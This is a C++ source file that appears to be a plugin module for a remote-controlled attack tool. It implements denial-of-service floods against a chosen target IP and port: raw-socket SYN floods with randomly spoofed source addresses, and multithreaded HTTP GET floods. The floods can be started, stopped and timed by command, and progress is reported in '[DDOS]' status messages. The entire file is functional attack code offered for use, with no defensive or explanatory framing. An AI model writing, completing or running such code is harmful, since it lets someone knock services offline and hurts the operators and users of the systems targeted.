#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>
#include <random>
#include <functional>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>

// Module callback type for output
using module_callback_t = std::function<void(const std::vector<char>&)>;

// Global control variables
static std::atomic<bool> attack_running{false};
static std::vector<std::thread> attack_threads;

// TCP checksum calculation
uint16_t calculate_checksum(uint16_t *addr, int len) {
    int nleft = len;
    uint32_t sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char*)(&answer) = *(unsigned char*)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

// Pseudo header for TCP checksum
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

uint16_t tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    struct pseudo_header psh;
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));
    
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char* pseudogram = new char[psize];
    
    memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
    
    uint16_t result = calculate_checksum((uint16_t*)pseudogram, psize);
    delete[] pseudogram;
    return result;
}

// Generate random source IP
std::string generate_random_ip() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(1, 254);
    
    return std::to_string(dis(gen)) + "." + 
           std::to_string(dis(gen)) + "." + 
           std::to_string(dis(gen)) + "." + 
           std::to_string(dis(gen));
}

// Single attack thread
void syn_flood_worker(const std::string& target_ip, int target_port, 
                     int packets_per_second, module_callback_t send_output) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        std::string error = "[DDOS] Failed to create raw socket: " + std::string(strerror(errno));
        send_output(std::vector<char>(error.begin(), error.end()));
        return;
    }

    // Enable IP header inclusion
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        std::string error = "[DDOS] Failed to set IP_HDRINCL: " + std::string(strerror(errno));
        send_output(std::vector<char>(error.begin(), error.end()));
        close(sockfd);
        return;
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &dest.sin_addr);

    char packet[4096];
    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    // Calculate timing for rate limiting
    auto packet_interval = std::chrono::microseconds(1000000 / packets_per_second);
    auto next_send = std::chrono::high_resolution_clock::now();
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<uint16_t> port_dist(1024, 65535);
    std::uniform_int_distribution<uint32_t> seq_dist(0, UINT32_MAX);

    uint64_t packets_sent = 0;
    auto start_time = std::chrono::high_resolution_clock::now();

    while (attack_running) {
        // Zero out packet
        memset(packet, 0, sizeof(packet));
        
        // Generate random source IP and port
        std::string src_ip = generate_random_ip();
        uint16_t src_port = port_dist(gen);
        uint32_t seq_num = seq_dist(gen);

        // Fill IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(getpid() + packets_sent);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        inet_pton(AF_INET, src_ip.c_str(), &iph->saddr);
        iph->daddr = dest.sin_addr.s_addr;

        // Fill TCP header
        tcph->source = htons(src_port);
        tcph->dest = htons(target_port);
        tcph->seq = htonl(seq_num);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;

        // Calculate checksums
        tcph->check = tcp_checksum(iph, tcph);
        iph->check = calculate_checksum((uint16_t*)packet, sizeof(struct iphdr));

        // Send packet
        if (sendto(sockfd, packet, ntohs(iph->tot_len), 0, 
                   (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            if (errno == EPERM) {
                std::string error = "[DDOS] Permission denied - need root privileges";
                send_output(std::vector<char>(error.begin(), error.end()));
                break;
            }
        } else {
            packets_sent++;
        }

        // Rate limiting
        next_send += packet_interval;
        std::this_thread::sleep_until(next_send);
        
        // Report status every 10 seconds
        auto now = std::chrono::high_resolution_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time);
        if (elapsed.count() > 0 && elapsed.count() % 10 == 0 && 
            packets_sent % (packets_per_second * 10) == 0) {
            std::string status = "[DDOS] Sent " + std::to_string(packets_sent) + 
                               " packets in " + std::to_string(elapsed.count()) + " seconds";
            send_output(std::vector<char>(status.begin(), status.end()));
        }
    }

    close(sockfd);
    
    auto end_time = std::chrono::high_resolution_clock::now();
    auto total_time = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time);
    std::string final_status = "[DDOS] Thread finished. Sent " + std::to_string(packets_sent) + 
                              " packets in " + std::to_string(total_time.count()) + " seconds";
    send_output(std::vector<char>(final_status.begin(), final_status.end()));
}

// HTTP flood worker
void http_flood_worker(const std::string& target_ip, int target_port, 
                      const std::string& path, int requests_per_second,
                      module_callback_t send_output) {
    auto request_interval = std::chrono::microseconds(1000000 / requests_per_second);
    auto next_request = std::chrono::high_resolution_clock::now();
    
    uint64_t requests_sent = 0;
    auto start_time = std::chrono::high_resolution_clock::now();
    
    std::string http_request = "GET " + path + " HTTP/1.1\r\n"
                              "Host: " + target_ip + "\r\n"
                              "User-Agent: Mozilla/5.0 (compatible)\r\n"
                              "Connection: close\r\n\r\n";

    while (attack_running) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &server.sin_addr);
        
        // Set non-blocking and timeout
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        
        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == 0) {
            send(sockfd, http_request.c_str(), http_request.length(), 0);
            requests_sent++;
        }
        
        close(sockfd);
        
        next_request += request_interval;
        std::this_thread::sleep_until(next_request);
        
        // Status reporting
        auto now = std::chrono::high_resolution_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time);
        if (elapsed.count() > 0 && elapsed.count() % 10 == 0 && 
            requests_sent % (requests_per_second * 10) == 0) {
            std::string status = "[HTTP] Sent " + std::to_string(requests_sent) + 
                               " requests in " + std::to_string(elapsed.count()) + " seconds";
            send_output(std::vector<char>(status.begin(), status.end()));
        }
    }
    
    auto end_time = std::chrono::high_resolution_clock::now();
    auto total_time = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time);
    std::string final_status = "[HTTP] Thread finished. Sent " + std::to_string(requests_sent) + 
                              " requests in " + std::to_string(total_time.count()) + " seconds";
    send_output(std::vector<char>(final_status.begin(), final_status.end()));
}

// Parse attack parameters
struct AttackParams {
    std::string target_ip;
    int target_port;
    std::string attack_type;
    int threads;
    int rate;
    int duration;
    std::string path; // For HTTP attacks
};

AttackParams parse_params(const std::string& data) {
    AttackParams params;
    std::istringstream iss(data);
    std::string token;
    
    // Format: "target_ip target_port attack_type threads rate duration [path]"
    iss >> params.target_ip >> params.target_port >> params.attack_type 
        >> params.threads >> params.rate >> params.duration;
    
    if (params.attack_type == "http") {
        iss >> params.path;
        if (params.path.empty()) params.path = "/";
    }
    
    // Validate and set defaults
    if (params.threads <= 0 || params.threads > 100) params.threads = 4;
    if (params.rate <= 0 || params.rate > 10000) params.rate = 100;
    if (params.duration <= 0 || params.duration > 3600) params.duration = 60;
    
    return params;
}

// Module initialization
extern "C" void init() {
    // Module initialization if needed
}

// Module cleanup
extern "C" void cleanup() {
    // Stop any running attacks
    if (attack_running) {
        attack_running = false;
        for (auto& thread : attack_threads) {
            if (thread.joinable()) {
                thread.join();
            }
        }
        attack_threads.clear();
    }
}

// Main module run function
extern "C" void run(const std::vector<char>& data, module_callback_t send_output) {
    std::string data_str(data.begin(), data.end());
    
    if (data_str == "stop") {
        if (attack_running) {
            attack_running = false;
            send_output(std::vector<char>(std::string("[DDOS] Stopping attack...").begin(),
                                        std::string("[DDOS] Stopping attack...").end()));
            
            for (auto& thread : attack_threads) {
                if (thread.joinable()) {
                    thread.join();
                }
            }
            attack_threads.clear();
            
            send_output(std::vector<char>(std::string("[DDOS] Attack stopped").begin(),
                                        std::string("[DDOS] Attack stopped").end()));
        } else {
            send_output(std::vector<char>(std::string("[DDOS] No attack running").begin(),
                                        std::string("[DDOS] No attack running").end()));
        }
        return;
    }
    
    if (attack_running) {
        send_output(std::vector<char>(std::string("[DDOS] Attack already running").begin(),
                                    std::string("[DDOS] Attack already running").end()));
        return;
    }
    
    AttackParams params = parse_params(data_str);
    
    if (params.target_ip.empty() || params.target_port <= 0) {
        send_output(std::vector<char>(std::string("[DDOS] Invalid parameters").begin(),
                                    std::string("[DDOS] Invalid parameters").end()));
        return;
    }
    
    attack_running = true;
    attack_threads.clear();
    
    std::string start_msg = "[DDOS] Starting " + params.attack_type + " attack against " + 
                           params.target_ip + ":" + std::to_string(params.target_port) +
                           " with " + std::to_string(params.threads) + " threads for " +
                           std::to_string(params.duration) + " seconds";
    send_output(std::vector<char>(start_msg.begin(), start_msg.end()));
    
    // Start attack threads
    for (int i = 0; i < params.threads; i++) {
        if (params.attack_type == "syn") {
            attack_threads.emplace_back(syn_flood_worker, params.target_ip, params.target_port,
                                      params.rate / params.threads, send_output);
        } else if (params.attack_type == "http") {
            attack_threads.emplace_back(http_flood_worker, params.target_ip, params.target_port,
                                      params.path, params.rate / params.threads, send_output);
        }
    }
    
    // Timer thread to stop attack after duration
    std::thread timer_thread([params, send_output]() {
        std::this_thread::sleep_for(std::chrono::seconds(params.duration));
        if (attack_running) {
            attack_running = false;
            std::string stop_msg = "[DDOS] Attack duration expired, stopping...";
            send_output(std::vector<char>(stop_msg.begin(), stop_msg.end()));
        }
    });
    timer_thread.detach();
}
